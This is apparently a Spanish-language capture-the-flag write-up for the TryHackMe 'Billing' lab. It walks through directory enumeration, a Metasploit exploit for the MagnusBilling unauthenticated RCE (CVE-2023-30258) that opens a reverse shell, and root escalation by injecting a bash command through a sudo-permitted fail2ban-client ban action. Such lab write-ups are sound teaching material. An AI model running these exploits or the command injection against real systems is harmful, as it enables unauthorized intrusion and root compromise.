# Billing - TryHackMe
**IP:** 10.10.119.166

## Enumeración
```bash
gobuster dir -u http://10.10.119.166 -w /usr/share/wordlists/dirb/common.txt
```
**MagnusBilling** (facturación VoIP sobre Asterisk).

## Explotación - MagnusBilling RCE (CVE-2023-30258)
```bash
msfconsole
use exploit/linux/http/magnusbilling_unauth_rce_cve_2023_30258
set RHOSTS 10.10.119.166
set LHOST <mi_ip>
exploit
```
Shell como el usuario del servicio (asterisk).

## Escalada - sudo fail2ban-client
```bash
sudo -l
# (root) NOPASSWD: /usr/bin/fail2ban-client
```
`fail2ban-client` permite redefinir la acción de baneo, que corre como root. Inyectamos un comando arbitrario:
```bash
sudo /usr/bin/fail2ban-client set sshd action iptables-multiport actionban \
  "/bin/bash -c 'cat /root/root.txt > /tmp/root.txt && chmod 666 /tmp/root.txt'"
```
Forzando un ban (varios logins SSH fallidos) el comando se ejecuta como root → leemos la flag.
